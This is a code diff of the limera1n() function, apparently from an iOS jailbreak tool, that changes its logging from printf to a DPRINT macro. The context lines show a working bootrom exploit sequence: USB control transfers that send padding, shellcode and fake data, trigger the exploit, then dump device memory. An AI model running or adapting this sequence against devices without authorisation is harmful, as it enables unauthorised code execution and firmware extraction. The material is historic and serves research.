@@ -176,12 +176,10 @@ int limera1n()
 		       s5l8930x_image_raw_jump_bin_len);
 	}
 
-	hex_dump(bootrom_dump_sc, 72);
-
-	printf("Resetting device counters\n");
+	DPRINT("Resetting device counters\n");
 	error = irecv_reset_counters(client);
 	if (error != IRECV_E_SUCCESS) {
-		printf("%s\n", irecv_strerror(error));
+		DPRINT("%s\n", irecv_strerror(error));
 		return -1;
 	}
 
@@ -202,7 +200,7 @@ int limera1n()
 #endif
 	}
 
-	printf("Sending chunk headers\n");
+	DPRINT("Sending chunk headers\n");
 	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 
 	memset(buf, 0xCC, 0x800);
@@ -210,26 +208,26 @@ int limera1n()
 		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 	}
 
-	printf("Sending exploit payload\n");
+	DPRINT("Sending exploit payload\n");
 	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
 
-	printf("Sending fake data\n");
+	DPRINT("Sending fake data\n");
 	memset(buf, 0xBB, 0x800);
 	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
 	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
 
-	printf("Executing exploit\n");
+	DPRINT("Executing exploit\n");
 	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
 	irecv_reset(client);
 	irecv_finish_transfer(client);
 
-	printf("Exploit sent\n");
+	DPRINT("Exploit sent\n");
 
-	printf("Reconnecting to device\n");
+	DPRINT("Reconnecting to device\n");
 	client = irecv_reconnect(client, 2);
 	if (client == NULL) {
-		printf("%s\n", irecv_strerror(error));
-		printf("Unable to reconnect\n");
+		DPRINT("%s\n", irecv_strerror(error));
+		DPRINT("Unable to reconnect\n");
 		return -1;
 	}
 
@@ -248,13 +246,13 @@ int limera1n()
 				break;
 			fwrite(data, 1, 0x800, fp);
 			address += 0x800;
-			printf("Dumping 0x%08x\n", address);
+			DPRINT("Dumping 0x%08x\n", address);
 		} while (address < 0x10000);
 
-		printf("dumped.\n");
+		DPRINT("dumped.\n");
 		exit(0);
 	} else if (raw_load == true) {
-		printf("Done!\n");
+		DPRINT("Done!\n");
 		exit(0);
 	}
 
